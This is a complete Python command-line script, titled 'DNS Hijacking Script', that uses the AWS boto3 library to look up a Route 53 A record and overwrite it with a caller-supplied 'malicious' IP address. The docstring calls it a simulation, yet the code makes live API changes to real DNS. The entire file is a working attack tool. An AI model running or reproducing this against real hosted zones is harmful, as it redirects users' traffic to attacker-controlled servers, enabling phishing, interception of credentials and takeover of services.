import argparse
import boto3

def hijack_dns_record(hosted_zone_id, domain_name, malicious_ip):
    """
    Simulate DNS hijacking by updating a DNS record to point to a malicious IP address.
    
    Args:
    - hosted_zone_id: ID of the Route 53 hosted zone.
    - domain_name: Domain name to hijack.
    - malicious_ip: Malicious IP address to redirect traffic to.
    """
    route53_client = boto3.client('route53')
    
    try:
        # Get the existing DNS record
        response = route53_client.list_resource_record_sets(
            HostedZoneId=hosted_zone_id,
            StartRecordName=domain_name,
            StartRecordType='A',
            MaxItems='1'
        )
        
        # Extract the existing DNS record
        record = response['ResourceRecordSets'][0]
        
        # Create a new DNS record with the same settings but pointing to the malicious IP
        new_record = {
            'Name': record['Name'],
            'Type': record['Type'],
            'TTL': record['TTL'],
            'ResourceRecords': [{'Value': malicious_ip}]
        }
        
        # Update the DNS record
        route53_client.change_resource_record_sets(
            HostedZoneId=hosted_zone_id,
            ChangeBatch={
                'Changes': [{
                    'Action': 'UPSERT',
                    'ResourceRecordSet': new_record
                }]
            }
        )
        
        print(f"DNS record for '{domain_name}' hijacked. Traffic redirected to '{malicious_ip}'.")
    except Exception as e:
        print(f"Failed to hijack DNS record: {e}")

def main():
    # Argument parser
    parser = argparse.ArgumentParser(description='DNS Hijacking Script')
    
    # Command-line arguments
    parser.add_argument('--zone-id', required=True, help='ID of the Route 53 hosted zone')
    parser.add_argument('--domain', required=True, help='Domain name to hijack')
    parser.add_argument('--malicious-ip', required=True, help='Malicious IP address to redirect traffic to')
    
    # Parse arguments
    args = parser.parse_args()
    
    # Hijack DNS record
    hijack_dns_record(args.zone_id, args.domain, args.malicious_ip)

if __name__ == "__main__":
    main()
